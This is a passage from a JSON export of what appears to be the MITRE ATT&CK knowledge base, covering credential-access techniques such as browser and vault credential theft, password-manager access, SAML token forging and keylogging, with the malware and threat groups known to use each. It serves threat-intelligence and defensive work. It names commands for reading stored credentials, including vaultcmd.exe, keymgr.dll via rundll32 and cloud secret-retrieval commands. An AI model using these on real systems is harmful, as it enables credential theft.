"description": "Patchwork dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer. "}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD can harvest saved credentials from browsers such as Google Chrome, Microsoft Internet Explorer, and Mozilla Firefox."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a Python tool named Browdec.exe to steal browser credentials."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers."}, {"id": "S0279", "name": "Proton", "description": "Proton gathers credentials for Google Chrome."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use Lazagne for harvesting credentials."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has collected usernames and passwords from Firefox and Chrome."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can obtain passwords from common web browsers."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer collects passwords, cookies, and autocomplete information from various popular web browsers."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use tools to collect credentials from web browsers."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl used LaZagne to obtain passwords from web browsers."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can gather browser usernames and passwords."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can steal credentials stored in Web browsers by querying the sqlite database."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can collect clear text web credentials for Internet Explorer/Edge."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader searches for credentials stored from web browsers."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP variants have harvested credentials from browsers such as Firefox, Chrome, Opera, and Edge."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used malware to gather credentials from Internet Explorer."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can steal data and credentials from browsers."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of stealing usernames and passwords from browsers on the victim machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has targeted network administrator browser data including browsing history and stored credentials."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the getFirefoxPassword function to attempt to locate Firefox passwords."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has the capability to upload dumper tools that extract credentials from web browsers and store them in database files."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome."}]}, {"name": "Windows Credential Manager", "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).", "detailed_description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\nCredential Lockers store credentials in encrypted .vcrd files, located under %Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\. The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials.\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as CredEnumerateA, may also be absued to list credentials managed by the Credential Manager.\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running rundll32.exe keymgr.dll KRShowKeyMgr then selecting the \"Back up...\" button on the \"Stored User Names and Passwords\" GUI.\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.", "id": "T1555.004", "examples": [{"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can collect credentials from the Windows Credential Manager."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credentials from Vault files."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using vaultcmd.exe and another that can collect RDP access credentials using the CredEnumerateW function."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz contains functionality to acquire credentials from the Windows Credential Manager."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use the QuarksPwDump tool to obtain local passwords and domain cached credentials."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can steal credentials by leveraging the Windows Vault mechanism."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can gather Windows Vault credentials."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers passwords from the Windows Credential Vault."}, {"id": "G0010", "name": "Turla", "description": "Turla has gathered credentials from the Windows Credential Manager tool."}, {"id": "S0476", "name": "Valak", "description": "Valak can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network."}]}, {"name": "Password Managers", "description": "Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.", "detailed_description": "Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access. Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.", "id": "T1555.005", "examples": [{"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used scripts to access credential information from the KeePass database."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has accessed and exported passwords from password managers."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has accessed local password managers and databases to obtain further credentials from a compromised network."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can gather information from the Keepass password manager."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors accessed and collected credentials from password managers."}, {"id": "S0279", "name": "Proton", "description": "Proton gathers credentials in files for 1password."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 obtained a KeePass database from a compromised host."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can steal passwords from the KeePass open source password manager."}]}, {"name": "Cloud Secrets Management Stores", "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.", "detailed_description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged Cloud Accounts or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as get-secret-value in AWS, gcloud secrets describe in GCP, and az key vault secret show in Azure.\nNote: this technique is distinct from Cloud Instance Metadata API in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.", "id": "T1555.006", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can retrieve secrets from the AWS Secrets Manager via the enum_secrets module."}]}]}, {"name": "Exploitation for Credential Access", "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.", "detailed_description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.", "id": "T1212", "examples": [], "sub_techniques": []}, {"name": "Forced Authentication", "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.", "detailed_description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.  With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials.\nThere are several different ways this can occur.  Some specifics from in-the-wild use include:", "id": "T1187", "examples": [{"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure."}], "sub_techniques": []}, {"name": "Forge Web Credentials", "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.", "detailed_description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\nThe generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values. Adversaries may also forge tokens by taking advantage of features such as the AssumeRole and GetFederationToken APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the zmprov gdpak command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.\nOnce forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.", "id": "T1606", "examples": [], "sub_techniques": [{"name": "Web Cookies", "description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.", "detailed_description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.", "id": "T1606.001", "examples": [{"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key."}]}, {"name": "SAML Tokens", "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the NotOnOrAfter value of the conditions ... element in a token. This value can be changed using the AccessTokenLifetime in a LifetimeTokenPolicy. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.", "detailed_description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the NotOnOrAfter value of the conditions ... element in a token. This value can be changed using the AccessTokenLifetime in a LifetimeTokenPolicy. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\nAn adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.", "id": "T1606.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can be used to create SAML tokens using the AD Federated Services token signing certificate."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates."}]}]}, {"name": "Input Capture", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "detailed_description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "id": "T1056", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has utilized tools to capture mouse movements."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has a module to perform any API hooking it desires."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect mouse events."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can conduct mouse event logging."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can log mouse events."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY captures user input into the Winlogon process by redirecting RPC traffic from legitimate listening DLLs within the operating system to a newly registered malicious item that allows for recording logon information in cleartext."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation intercepted and harvested credentials from user logins to compromised devices."}], "sub_techniques": [{"name": "Keylogging", "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.", "detailed_description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:", "id": "T1056.001", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. "}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can perform keylogging."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can log keystrokes on the victim\u2019s machine."}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can use GetKeyState and GetKeyboardState to capture keystrokes on the victim\u2019s machine."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used tools to perform keylogging."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used a keylogging tool that records keystrokes in encrypted files."}, {"id": "G0050", "name": "APT32", "description": "APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes."}, {"id": "G0082", "name": "APT38", "description": "APT38 used a Trojan called KEYLIME to capture keystrokes from the victim\u2019s machine."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used tools for capturing keystrokes."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a keylogger called GEARSHIFT on a target system."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used malware with keylogging capabilities to monitor the communications of targeted entities."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth logs keystrokes from the victim's machine. "}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can capture keystrokes on the victim\u2019s machine."}, {"id": "S0438", "name": "Attor", "description": "One of Attor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger."}, {"id": "S0128", "name": "BADNEWS", "description": "When it first starts, BADNEWS spawns a new thread to log keystrokes."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch has a keylogging capability."}, {"id": "S0234", "name": "Bandook", "description": "Bandook contains keylogging capabilities."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT can capture keystrokes."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has run a keylogger plug-in on a victim."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to log keystrokes on the compromised host."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak logs key strokes for configured processes and sends them back to the C2 server."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can log keystrokes."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas collects keystrokes from the victim\u2019s machine."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has the ability to support keylogging."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK is capable of performing keylogging."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can capture keystrokes on a compromised host."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can track key presses with a keylogger module."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT has a feature to perform keylogging on the victim\u2019s machine."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses a keylogger."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can use a module to perform keylogging on compromised hosts."}, {"id": "S0625", "name": "Cuba", "description": "Cuba logs keystrokes via polling by using GetKeyState and VkKeyScan functions."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet has a keylogging capability."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate will spawn a thread on execution to capture all keyboard events and write them to a predefined log file."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used a keylogger."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can download a keylogging module."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can track key presses with a keylogger module."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can log keystrokes."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of logging keystrokes."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL is capable of logging keystrokes."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack\u2019s dropper contains a keylogging executable."}, {"id": "S0038", "name": "Duqu", "description": "Duqu can track key presses with a keylogger module."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can perform keylogging operations."}, {"id": "S0062", "name": "DustySky", "description": "DustySky contains a keylogger."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON can capture and store keystrokes."}, {"id": "S0363", "name": "Empire", "description": "Empire includes keylogging capabilities for Windows, Linux, and macOS systems."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab has the capability to capture keystrokes."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers."}, {"id": "S0076", "name": "FakeM", "description": "FakeM contains a keylogger module."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has logged the keystrokes of victims to escalate privileges."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect keyboard events."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream Keyrecord component can capture keystrokes."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis can perform keylogging."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has a keylogger."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can log keystrokes on the victim's machine."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has a module to harvest pressed keystrokes."}, {"id": "G0043", "name": "Group5", "description": "Malware used by Group5 is capable of capturing keystrokes."}, {"id": "S0170", "name": "Helminth", "description": "The executable version of Helminth has a module to log keystrokes."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a PowerShell-based keylogger named kl.ps1."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser is capable of capturing keystrokes on victims."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a keylogging module."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can capture keystrokes on a compromised host."}, {"id": "S0201", "name": "JPIN", "description": "JPIN contains a custom keylogger."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has the capability to log keystrokes from the victim\u2019s machine, both offline and online."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to initiate keylogging."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used keyloggers."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy installs a keylogger for intercepting credentials and keystrokes."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can perform keylogging by polling the GetAsyncKeyState() function."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to initiate keylogging on the infected host."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has the capability to perform keylogging."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware KiloAlfa contains keylogging functionality."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to capture input on the compromised host via keylogging."}, {"id": "S0409", "name": "Machete", "description": "Machete logs keystrokes from the victim\u2019s machine."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy captures keystrokes."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware is capable of keylogging."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can capture all keystrokes on a compromised host."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka is capable of keylogging."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used key loggers to steal usernames and passwords."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has the ability to log keyboard events."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a command to launch a keylogger and capture keystrokes on the victim\u2019s machine."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes keylogger payloads focused on the QQ chat application."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia has keylogging capabilities."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can log keystrokes on the victim's machine."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind has a keylogger."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can perform keylogging on the victim\u2019s machine."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT logs the keystrokes on the targeted system."}, {"id": "S0033", "name": "NetTraveler", "description": "NetTraveler contains a keylogger."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can perform keylogging."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use a plugin for keylogging."}, {"id": "S0385", "name": "njRAT", "description": "njRAT is capable of logging keystrokes."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used keylogging tools called KEYPUNCH and LONGWATCH."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using a keylogger tool to capture keystrokes. "}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has the ability to capture keystrokes."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can log keystrokes on compromised hosts."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used several different keyloggers."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module for capturing keystrokes per process including window titles."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a Python tool named klog.exe for keylogging."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy contains a keylogger."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can use a module to log keystrokes."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-Keystrokes Exfiltration module can log keystrokes."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows."}, {"id": "S0279", "name": "Proton", "description": "Proton uses a keylogger to capture keystrokes."}, {"id": "S0192", "name": "Pupy", "description": "Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can capture keystrokes on a compromised host."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has a built-in keylogger."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to capture keystrokes on a compromised host."}, {"id": "S0019", "name": "Regin", "description": "Regin contains a keylogger."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command for keylogging."}, {"id": "S0375", "name": "Remexi", "description": "Remexi gathers and exfiltrates keystrokes from the machine."}, {"id": "S0125", "name": "Remsec", "description": "Remsec contains a keylogger component."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin for keylogging."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use  SetWindowsHookEx and GetKeyNameText to capture keystrokes."}, {"id": "S0090", "name": "Rover", "description": "Rover has keylogging functionality."}, 